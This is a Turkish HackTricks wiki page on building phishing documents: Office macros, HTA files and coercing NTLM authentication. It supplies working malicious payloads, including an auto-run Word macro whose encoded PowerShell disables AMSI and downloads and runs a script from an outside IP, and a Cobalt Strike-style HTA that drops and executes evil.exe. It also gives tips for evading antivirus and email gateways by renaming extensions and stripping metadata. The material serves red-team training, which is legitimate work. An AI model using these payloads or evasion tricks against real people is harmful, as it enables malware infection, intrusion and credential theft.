# Phishing Dosyaları ve Belgeleri

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz?** **Şirketinizi HackTricks'te reklamını görmek ister misiniz?** ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile paylaşın**.

</details>

## Ofis Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, incelenen dosya açılmaz.

Genellikle, makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyayı yeniden adlandırarak makro yürütme yeteneklerini korumak mümkündür.\
Örneğin, RTF dosyası, tasarım gereği makroları desteklemez, ancak RTF olarak yeniden adlandırılmış bir DOCM dosyası, Microsoft Word tarafından işlenecek ve makro yürütme yeteneğine sahip olacaktır.\
Aynı iç yapı ve mekanizmalar, Microsoft Office Suite'in tüm yazılımlarına (Excel, PowerPoint vb.) uygulanır.

Bazı Ofis programları tarafından yürütülecek uzantıları kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
### Harici Görüntü Yükleme

Git: _Ekle --> Hızlı Parçalar --> Alan_\
_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://\<ip>/nebilirim

![](<../../.gitbook/assets/image (152).png>)

### Macros Arka Kapı

Makroların belgeden keyfi kod çalıştırmak için kullanılması mümkündür.

#### Otomatik Yükleme işlevleri

Daha yaygın oldukları takdirde, AV'nin onları tespit etme olasılığı daha yüksektir.

* AutoOpen()
* Document\_Open()

#### Makrolar Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verilerini manuel olarak kaldırma

**Dosya > Bilgi > Belgeyi İncele > Belgeyi İncele**'ye gidin, bu Belge Denetleyicisini açacaktır. **İncele**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler** yanındaki **Tümünü Kaldır**'a tıklayın.

#### Belge Uzantısı

Tamamlandığında, **Farklı Kaydet** açılır menüsünden, formatı **`.docx`** yerine **Word 97-2003 `.doc`** olarak değiştirin.\
Bunu yapın çünkü **makroları `.docx` içine kaydedemezsiniz** ve makro destekli **`.docm`** uzantısı etrafında bir **önyargı** var (örneğin, küçük resim simgesinde büyük bir `!` işareti bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Zararlı Makro Oluşturucuları

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

Bir HTA, HTML ve VBScript ve JScript gibi betik dillerini **birleştiren bir Windows programıdır**. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tamamen güvenilir" bir uygulama olarak çalıştırılır.

Bir HTA, genellikle **Internet Explorer ile birlikte yüklenen** **`mshta.exe`** kullanılarak çalıştırılır, bu da **`mshta`'nın IE'ye bağlı** olduğu anlamına gelir. Bu nedenle, IE kaldırılmışsa, HTA'lar çalışamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlamak

**NTLM kimlik doğrulamasını "uzaktan" zorlamak** için birkaç yol bulunmaktadır, örneğin, kullanıcı erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbanı, sadece **klasörü açmak için kimlik doğrulamasını tetikleyecek dosyaların adresini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Aktarımı

Unutmayın, sadece hash'i veya kimlik doğrulamayı çalmakla kalmayıp aynı zamanda **NTLM aktarım saldırıları da gerçekleştirebilirsiniz**:

* [**NTLM Aktarım Saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM aktarımı sertifikalara)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
